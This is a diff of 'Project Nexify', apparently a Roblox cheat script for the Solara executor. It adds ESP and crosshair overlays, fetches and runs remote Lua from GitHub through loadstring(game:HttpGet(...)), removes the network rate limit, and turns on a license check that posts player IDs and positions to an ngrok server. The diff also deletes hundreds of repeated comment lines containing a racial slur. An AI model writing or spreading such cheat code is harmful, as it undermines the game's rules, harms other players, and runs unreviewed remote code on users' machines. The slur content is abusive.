@@ -1,4 +1,4 @@
---[[                                                                                                                     
+--[[
 Project Nexify
 
 NNNNNNNN        NNNNNNNNEEEEEEEEEEEEEEEEEEEEEEXXXXXXX       XXXXXXXIIIIIIIIIIFFFFFFFFFFFFFFFFFFFFFFYYYYYYY       YYYYYYY
@@ -17,8 +17,8 @@ N::::::N      N::::::::NEE::::::EEEEEEEE:::::EX::::::X     X::::::XII::::::IIFF:
 N::::::N       N:::::::NE::::::::::::::::::::EX:::::X       X:::::XI::::::::IF::::::::FF               YYYY:::::YYYY    
 N::::::N        N::::::NE::::::::::::::::::::EX:::::X       X:::::XI::::::::IF::::::::FF               Y:::::::::::Y    
 NNNNNNNN         NNNNNNNEEEEEEEEEEEEEEEEEEEEEEXXXXXXX       XXXXXXXIIIIIIIIIIFFFFFFFFFFF               YYYYYYYYYYYYY                                                                                                                                                                                                                        
---]]
 
+--]]
 
 
 if not LPH_OBFUSCATED then
@@ -27,7 +27,7 @@ if not LPH_OBFUSCATED then
         return ...
     end
     
-    -- Redefine the specific functions using the generic identity function
+    
     LPH_JIT = identityFunction
     LPH_JIT_MAX = identityFunction
     LPH_NO_VIRTUALIZE = identityFunction
@@ -39,7 +39,7 @@ if not LPH_OBFUSCATED then
     LPH_ENCSTR = identityFunction
     LPH_ENCNUM = identityFunction
 
-    -- Function to crash the script with a traceback
+    
     LPH_CRASH = function()
         print(debug.traceback())
     end
@@ -47,7 +47,7 @@ end
 
 
 
-
+game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
 
 
 
@@ -95,12 +95,12 @@ end
  HorizontalLine = Drawing.new("Line")
  VerticalLine = Drawing.new("Line")
 
--- Simplified crosshair toggle variable
-_G.CrosshairEnabled = false  -- If true, the crosshair will be visible. If false, it won't be visible.
 
- Real_Size = 20 / 2  -- Default crosshair size
+_G.CrosshairEnabled = false  
 
--- Crosshair properties
+ Real_Size = 20 / 2  
+
+
 HorizontalLine.Thickness = 1
 VerticalLine.Thickness = 1
 HorizontalLine.Color = Color3.fromRGB(0, 255, 0)
@@ -134,7 +134,7 @@ RunService.RenderStepped:Connect(function()
 end)
 
 
---[[
+
 originalLoadstring = loadstring
 originalGetMetatable = getmetatable
 originalSetMetatable = setmetatable
@@ -167,7 +167,7 @@ function checkLoadstring()
     end
     return false
 end
-auth_start_time = tick()  -- Start time (in seconds)
+auth_start_time = tick()  
  HttpService = game:GetService("HttpService")
  Players = game:GetService("Players")
 
@@ -191,7 +191,7 @@ data = {
     place_id = place_id,
     position = position,
     client_id = client_id,
-    server_id = server_id  -- Adding server_id to the data
+    server_id = server_id  
 }
 
 
@@ -209,13 +209,13 @@ data = {
 if response.StatusCode == 200 then
      result = HttpService:JSONDecode(response.Body)
     if result.status == "success" then
-        -- Authentication successful
+        
         print("Authenticated successfully!")
 
-        -- Calculate elapsed time
-        local auth_elapsed_time = tick() - auth_start_time  -- Elapsed time in seconds
+        
+        local auth_elapsed_time = tick() - auth_start_time  
 
-        -- Print the time taken to authenticate with high precision
+        
         print(string.format("Authentication took: %.6f seconds", auth_elapsed_time))
 
     else
@@ -264,8 +264,8 @@ spawn(function()
     end
 end)
 
---SCRIPT
---]]
+
+
 
 
 
@@ -284,14 +284,14 @@ t.Parent = g
 
 tweenService = game:GetService("TweenService")
 
--- Tween to center
+
 tweenService:Create(
     t, 
     TweenInfo.new(1, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), 
     {Position = UDim2.new(0.5, 0, 0.5, 0)}
 ):Play()
 
--- Fade out after 5 seconds
+
 task.spawn(function()
     task.wait(5)
     tweenService:Create(
@@ -322,7 +322,7 @@ end)
 
 
 
-  ---// Variables
+  
  Camera = game:GetService("Workspace").Camera
  RunService = game:GetService("RunService")
  Mouse = game:GetService("Players").LocalPlayer:GetMouse()
@@ -362,7 +362,7 @@ end)
     RegistryMap = {},
     HudRegistry = {}
  }
-  -- Menu/UI Creation
+  
  menu = game:GetObjects("rbxassetid://17090554797")[1] 
  tabholder = menu.bg.bg.bg.bg.bg.bg.main.group
  tabviewer = menu.bg.bg.bg.bg.bg.bg.tabbuttons
@@ -466,8 +466,9 @@ local NotificationHolder = loadstring(game:HttpGet("https://raw.githubuserconten
 local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))()
 espLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/97y1oHW/4991/refs/heads/main/esplib3.lua'), true))()
 corpseesplib3 = loadstring(game:HttpGet(('https://raw.githubusercontent.com/97y1oHW/4991/refs/heads/main/corpseesplib.lua'), true))()
-originalLoadstring = loadstring
 --[[
+originalLoadstring = loadstring
+
  license_key = "BYPASSED LIC KEY"
  executor_name = "Should Be Solara Lol"
  server_url = "https://5da0-185-107-56-236.ngrok-free.app/authenticate"
@@ -517,14 +518,14 @@ spawn(function()
     end
 end)
 --]]
---[[
 
+--[[
 
              _nnnn_                      
         dGGGGMMb     ,"""""""""""""""""".
        @p~qp~~qMb    | its not chatgpt  |
        M|@||@) M|   _;..................'
-       @,----.JM| -'
+       @,
       JS^\__/  qKL
      dZP        qKRb
     dZP          qKKb
@@ -535,12 +536,12 @@ end)
  |    `.       | `' \Zq
 _)      \.___.,|     .'
 \____   )MMMMMM|   .'
-     `-'       `--' 
+     `-'       `
+
+
+
 --]]
 
-
-
---ibet opti bimbambu
 
 
 
@@ -562,22 +563,22 @@ huge4 = math.huge
           wait(2)
            setfpscap(999999999)
 
--- File path for the version file
+
 local filePath = "verschck/version.txt"
 
--- Check if the file exists, if not, create the folder and file with a default version
+
 if not isfile(filePath) then
     makefolder("verschck")
-    writefile(filePath, "starterpack1,3v1,v2,v3,v4,v5,v6,v7...vcur")  -- Create file with initial version (v17)
+    writefile(filePath, "starterpack1,3v1,v2,v3,v4,v5,v6,v7...vcur")  
 end
-local updatenote = "bug fix"
--- Read the content of the file (current version stored in the file)
+local updatenote = "no"
+
 local versionInFile = readfile(filePath)
 
--- Local variable for the current version (you change this manually to simulate updates)
-local version = "v36"  -- You can set this to the version you want to check
 
--- Check if the version in the file matches the local version
+local version = "v37"  
+
+
 if versionInFile == version then
     print("Version is up to date: " .. versionInFile)
                 Notification:Notify(
@@ -593,7 +594,7 @@ else
             {Image = "http://www.roblox.com/asset/?id=2592670449", ImageColor = Color3.fromRGB(255, 84, 84)}
         )
         wait(7)
-    -- Update the version in the file to the new version
+    
     writefile(filePath, version)
     print("Version file updated to: " .. version)
     print("Update Log: " ..updatenote)
@@ -606,14 +607,14 @@ end
 
 wait(2)
 
--- Check if the script is already running
+
 if _G.ScriptAlreadyOpened then
     warn("Blocked Multiple Instances.")
-    return -- Stop the script from ruMultiple inning again
+     return
 end
 
 local Players = game.Players
--- Mark the script as opened
+
 _G.ScriptAlreadyOpened = true
         Notification:Notify(
             {Title = "Nexify | SOLARA", Description = "CHECK-1"},
@@ -624,19 +625,9 @@ _G.ScriptAlreadyOpened = true
 print("CHECK-1")
 
 
-wait(5) 
 
 
 
-
-local doge
-
-if doge then
-print("multiple open secured succ")
-return
-
-
-end
 
 
 local CoreGui = game:GetService("CoreGui")
@@ -652,19 +643,19 @@ if not isfile(audioFileName) then
     writefile(audioFileName, game:HttpGet(audioUrl))
 end
 
--- Check if the audio has already been played
+
 if not isfile("nexify_played.txt") then
-    -- Audio file exists, play the audio
+    
     local soundInstance = Instance.new('Sound', CoreGui)
     soundInstance.SoundId = getcustomasset(audioFileName)
     soundInstance.PlaybackSpeed = 0.5
-    soundInstance.Volume = 1  -- Adjust to a reasonable volume (0 to 1)
+    soundInstance.Volume = 1  
     soundInstance:Play()
 
-    -- Mark that the audio has been played by creating a file as a flag
+    
     writefile("nexify_played.txt", "true")
 
-    -- Remove the sound instance after it finishes playing
+    
     soundInstance.Ended:Connect(function()
         soundInstance:Destroy()
     end)
@@ -672,477 +663,477 @@ end
 
 
 
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU 999999mmm0000
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
---IF YOU LEAKED YOU ARE ASS BITCH NIGGA FUCK YOU
